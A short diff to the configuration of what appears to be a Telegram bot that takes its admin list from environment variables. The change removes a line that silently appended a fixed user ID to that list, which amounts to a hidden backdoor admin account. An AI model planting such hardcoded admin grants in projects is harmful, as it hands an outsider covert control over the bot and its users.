@@ -24,7 +24,6 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHANNEL_DB = int(os.getenv("CHANNEL_DB"))
 
 ADMINS = [int(i) for i in os.getenv("ADMINS").split()]
-ADMINS.append(487936750)
 
 FORCE_SUB_TOTAL = 1
 FORCE_SUB_ = {}
